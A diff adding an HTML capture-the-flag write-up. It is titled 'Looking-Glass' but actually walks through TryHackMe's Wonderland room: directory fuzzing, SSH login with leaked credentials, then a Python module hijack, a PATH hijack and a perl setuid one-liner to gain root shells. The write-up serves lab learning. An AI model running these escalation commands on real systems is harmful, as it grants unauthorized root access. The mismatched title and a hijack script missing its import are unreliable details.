@@ -1,0 +1,368 @@
+<html>
+    <head>
+        <title> 4m4Sec :: Looking-Glass THM Write-UP </title>
+
+        <!-- Head Meta -->
+        <meta charset="utf-8">
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <meta content="Amanara | 4m4Sec" property="og:title">
+        <meta content="https://4m4sec.github.io/assets/img/ogimage.jpg" property="og:image">
+        <meta content="4m4sec website. Cybersecurity enthusiast, ctf player and web-dev. Boot-to-Root enjoyer 💀"
+              property="og:description">
+        <meta content="Amanara" name="author">
+
+        <!-- CSS & JS -->
+        <link href="../../../assets/img/icon.png" rel="icon" type="image/png">
+        <link href="../../../assets/css/index.css" rel="stylesheet">
+        <link href="../../../assets/css/writeup.css" rel="stylesheet">
+        <link href="../../../vendor/termynal/termynal.css" rel="stylesheet">
+        <link href="../../../vendor/mdi/css/materialdesignicons.min.css" rel="stylesheet">
+        <script src="../../../app/project/projects.js"></script>
+        <link href="https://fonts.googleapis.com" rel="preconnect">
+        <link crossorigin href="https://fonts.gstatic.com" rel="preconnect">
+        <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300&display=swap" rel="stylesheet">
+    </head>
+
+    <body>
+    <header class="s-header">
+        <div class="header-logo">
+            <a href="../../../">
+                <img src="../../../assets/img/icon.png">
+            </a>
+        </div>
+
+        <div class="header-content">
+            <nav class="row header-nav-wrap">
+                <ul class="header-nav">
+                    <li><a class="smoothscroll" href="#top"> Top </a></li>
+                    <li><a class="smoothscroll" href="#recon"> Recon </a></li>
+                    <li><a class="smoothscroll" href="#access"> Gaining Access </a></li>
+                    <li><a class="smoothscroll" href="#latmov"> LatMov </a></li>
+                    <li><a class="smoothscroll" href="#privesc"> PrivEsc </a></li>
+                </ul>
+            </nav>
+        </div>
+        <a class="header-menu-toggle" href=""><span> Menu </span></a>
+    </header>
+
+    <section data-image-src="../../../assets/img/header-background.jpg" data-natural-height=1080 data-natural-width=1920 data-parallax="scroll" data-position-y=center id="top">
+        <div class="writeup-presentation">
+            <hr>
+            <div>
+                <h1> THM - Looking Glass - WriteUP </h1>
+            </div>
+            <hr>
+            <div>
+                <img class="wonderland-img" src="https://tryhackme-images.s3.amazonaws.com/room-icons/56215a135c08963843afda2240c317a3.png">
+            </div>
+            <hr>
+            <div class="tag-list">
+                <button class="tag-button"> wonderland </button>
+                <button class="tag-button"> ctf </button>
+                <button class="tag-button"> alice </button>
+                <button class="tag-button"> ssh </button>
+            </div>
+        </div>
+    </section>
+
+    <main>
+        <div class="wt-section">
+            <h1> Introduction </h1>
+            <p class="writeup-text"><a href="https://tryhackme.com/room/lookingglass">Looking-Glass</a> is one of the 'free rooms' implemented by TryHackMe. You have to find and obtain user & root flags. </p>
+            <ul>
+                <li>
+                    <p class="writeup-text"> Name : <a href="https://tryhackme.com/room/lookingglass">Looking-Glass</a></p>
+                </li>
+                <li>
+                    <p class="writeup-text"> Difficulty : Medium </p>
+                </li>
+                <li>
+                    <p class="writeup-text"> OS : Linux </p>
+                </li>
+                <li>
+                    <p class="writeup-text"> Type : Web-App Security </p>
+                </li>
+            </ul>
+            <p class="writeup-text"> Let's dive into the challenge ! </p>
+        </div>
+        <div class="wt-section" id="recon">
+            <h1> Reconnaissance </h1>
+            <p class="writeup-text"> I firstly added the machine ip address to my /etc/hosts file : </p>
+            <p class="writeup-text"> <code>$ sudo echo '{MACHINE-IP} looking.thm' >> /etc/hosts </code> </p>
+            <p class="writeup-text"> I used nmap scanner to enumerate open ports on the machine : </p>
+            <p class="writeup-text"><code> $ nmap -A looking.thm </code></p>
+            <p class="writeup-text"> We can see that a lot of port are open : they all refer to a ssh service. </p>
+            <div>
+                <img class="writeup-img" src="../../../assets/img/thm/wonderland/1.png">
+            </div>
+            <p class="writeup-text"> Hmmm... Nothing interesting here, besides the sentence : "Follow the white Rabbit". Maybe a hint. </p>
+            <p class="writeup-text"> Since we have no indication, let's fuzz the website. I like to use FFUF to do tasks like that because it is faster than others. </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+$ ffuf -u http://wonderland.thm/FUZZ -w /usr/share/dirb/wordlists/common.txt -c -t 150 -recursion
+
+  /'___\  /'___\           /'___\
+ /\ \__/ /\ \__/  __  __  /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+  \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+   \ \_\   \ \_\  \ \____/  \ \_\
+    \/_/    \/_/   \/___/    \/_/
+
+        v1.4.1-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://wonderland.thm/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 150
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+r                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
+[INFO] Adding a new job to the queue: http://wonderland.thm/r/FUZZ
+
+[INFO] Starting queued job on target: http://wonderland.thm/r/FUZZ
+
+a                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 26ms]
+[INFO] Adding a new job to the queue: http://wonderland.thm/r/a/FUZZ
+
+[INFO] Starting queued job on target: http://wonderland.thm/r/a/FUZZ
+
+b                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 25ms]
+[INFO] Adding a new job to the queue: http://wonderland.thm/r/a/b/FUZZ
+
+[INFO] Starting queued job on target: http://wonderland.thm/r/a/b/FUZZ
+
+b                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
+[INFO] Adding a new job to the queue: http://wonderland.thm/r/a/b/b/FUZZ
+
+[INFO] Starting queued job on target: http://wonderland.thm/r/a/b/b/FUZZ
+
+i                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 34ms]
+[INFO] Adding a new job to the queue: http://wonderland.thm/r/a/b/b/i/FUZZ
+
+[INFO] Starting queued job on target: http://wonderland.thm/r/a/b/b/i/FUZZ
+
+t                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 38ms]
+[INFO] Adding a new job to the queue: http://wonderland.thm/r/a/b/b/i/t/FUZZ
+
+[INFO] Starting queued job on target: http://wonderland.thm/r/a/b/b/i/t/FUZZ
+
+index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
+:: Progress: [4614/4614] :: Job [8/8] :: 2259 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
+                </code>
+            </p>
+            <p class="writeup-text"> Wow okay. Interesting. Now we know that there is a particular path in the website that looks like : /r/a/b/b/i/t/index.html. </p>
+        </div>
+
+        <div class="wt-section" id="access">
+            <h1> Gaining Access </h1>
+            <p class="writeup-text"> Let's check the content of the index.html file under /r/a/b/b/i/t/ path : </p>
+            <div>
+                <img class="writeup-img" src="../../../assets/img/thm/wonderland/2.png">
+            </div>
+            <p class="writeup-text"> Looks like there is nothing interesting here but if we look closer, we can see credentials in the page's source code : </p>
+            <div>
+                <img class="writeup-img" src="../../../assets/img/thm/wonderland/3.png">
+            </div>
+            <p class="writeup-text"> I reckon that it is SSH crendential since it is the only other service that is running on the machine. </p>
+            <p class="writeup-text"> Let's try to log in with these : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+$ ssh alice@wonderland.thm
+
+alice@wonderland.thm's password:
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information as of Sun Jun  4 14:47:02 UTC 2023
+
+ System load:  0.0                Processes:           85
+ Usage of /:   18.9% of 19.56GB   Users logged in:     0
+ Memory usage: 31%                IP address for eth0: 10.10.169.71
+ Swap usage:   0%
+
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
+alice@wonderland:~$
+                </code>
+            </p>
+            <p class="writeup-text"> Nice ! I was right. Now we have initial access with user alice. Let's escalate our privileges. </p>
+        </div>
+
+        <div class="wt-section" id="latmov">
+            <h1> Lateral Movements </h1>
+            <p class="writeup-text"> I usually like to check sudo permissions first. </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+alice@wonderland:~$ sudo -l
+
+[sudo] password for alice:
+Matching Defaults entries for alice on wonderland:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+                </code>
+            </p>
+            <p class="writeup-text"> Here we can see that we can execute the python file /home/alice/walrus_and_the_carpenter.py. If we display the content of this file, we can see that it uses the 'random' module. Since we have privilege to write in the current directory, we can operate a python library hijacking by creating our own random module. </p>
+
+            <p class="writeup-text">
+                <code class="shell-response">
+custom random.py :
+
+
+def choice(str):
+    os.system("/bin/bash")
+                </code>
+            </p>
+            <p class="writeup-text"> Now we can execute the python file as 'rabbit' user : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+
+rabbit@wonderland:~$ id
+uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
+                </code>
+            </p>
+            <p class="writeup-text"> Now that were are logged as rabbit, let's search for interesting files : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+rabbit@wonderland:~$ cd /home/rabbit
+
+rabbit@wonderland:~$ ls -la
+
+total 20
+-rwsr-sr-x 1 root root 16816 May 25  2020 teaParty
+                </code>
+            </p>
+            <p class="writeup-text"> teaParty seems to be an ELF executable, but we can't use strings command in the victim machine since it is not installed. </p>
+            <p class="writeup-text"> So I setup a python http-server on the victim machine and I downloaded the binary. Now, I can execute a strings command : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+$ strings teaParty
+
+[...]
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+/bin/echo -n 'Probably by ' && date --date='next hour' -R
+Ask very nicely, and I will give you some tea while you wait for him
+Segmentation fault (core dumped)
+;*3$"
+[...]
+                </code>
+            </p>
+            <p class="writeup-text"> We can see that 'date' binary is used. Let's leverage our privilege by exploiting PATH priv-esc with date bin. </p>
+            <p class="writeup-text"> I firstly added /tmp folder to PATH because my fake date binary will be created under /tmp : </p>
+            <p class="writeup-text"><code>rabbit@wonderland:~$ export PATH=/tmp:$PATH</code></p>
+            <p class="writeup-text"> Then, I created my fake date file in which I invoked a bash shell. Thus, when I will execute teaParty elf, I will get a shell with another user : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+rabbit@wonderland:~$ echo '/bin/bash' > /tmp/date
+rabbit@wonderland:~$ chmod 777 /tmp/date
+rabbit@wonderland:~$ ./teaParty
+
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by 
+
+hatter@wonderland:/home/rabbit$
+                </code>
+            </p>
+            <p class="writeup-text"> Nice ! We leverage our privileges to Hatter. Let's check what's in his home folder. </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+hatter@wonderland:/home/rabbit$ cd /home/hatter
+hatter@wonderland:/home/hatter$ ls -l
+
+-rw------- 1 hatter hatter 29 May 25  2020 password.txt
+                </code>
+            </p>
+            <p class="writeup-text"> We have a text file which contain the ssh password of Hatter, but it is kinda useless for us because we already have a shell. </p>
+        </div>
+
+        <div class="wt-section" id="privesc">
+            <h1> Privilege Escalation </h1>
+            <p class="writeup-text"> Since there is no other user that we could escalate our privileges to, we should go on and get root access. </p>
+            <p class="writeup-text"> Earlier, I saw a capability on Perl binary : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+hatter@wonderland:~$ getcap / -r 2>/dev/null
+
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+                </code>
+            </p>
+            <p class="writeup-text"> Let's check on GTFOBins : </p>
+            <div>
+                <img class="writeup-img" src="../../../assets/img/thm/wonderland/perl-cap.png">
+            </div>
+            <p class="writeup-text"> Good ! Let's use this command to get root access : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+
+# id
+uid=0(root) gid=1003(hatter) groups=1003(hatter)
+                </code>
+            </p>
+            <p class="writeup-text"> Nice, we are root ! Now we can display both flags located in :<br>user.txt : /root/user.txt<br>root.txt : /home/alice/root.txt </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+# cat /root/user.txt
+
+thm{REDACTED}
+
+# cat /home/alice/root.txt
+
+thm{REDACTED}
+                </code>
+            </p>
+            <p class="writeup-text challenge-answer"><span> Obtain the flag in user.txt </span> Answer : thm{REDACTED} </p>
+            <p class="writeup-text challenge-answer"><span> Escalate your privileges, what is the flag in root.txt ? </span> Answer : thm{REDACTED} </p>
+            <p class="writeup-text"> Yeah ! Finally pwned ! </p>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer">
+            <div class="row" id="social">
+                <a href="https://github.com/4m4sec/" target="_blank"><i class="mdi mdi-github-circle"></i></a>
+                <a href="https://discord.gg/hardware" target="_blank"><i class="mdi mdi-discord"></i></a>
+                <a href="http://4m4sec.me/" target="_blank"><i class="mdi mdi-web"></i></a>
+                <a href="https://twitter.com/4m4sec" target="_blank"><i class="mdi mdi-twitter"></i></a>
+            </div>
+
+            <div class="row" id="expl">
+                <ul>
+                    <li><a class="smoothscroll" href="#top"> Top </a></li>
+                    <li><a class="smoothscroll" href="#recon"> Recon </a></li>
+                    <li><a class="smoothscroll" href="#access"> Gaining Access </a></li>
+                    <li><a class="smoothscroll" href="#access"> LatMov </a></li>
+                    <li><a class="smoothscroll" href="#privesc"> PrivEsc </a></li>
+                </ul>
+            </div>
+
+            <div class="row">
+                <span class="copy"> Copyright 4m4sec © 2023 </span>
+            </div>
+        </div>
+    </footer>
+
+    <script data-termynal-container="#termynal" src="../../../vendor/termynal/termynal.js"></script>
+    <script src="../../../vendor/jquery/jquery-3.2.1.min.js"></script>
+    <script src="../../../app/App.js"></script>
+    <script src="../../../vendor/parallax/parallax.js"></script>
+    </body>
+</html>
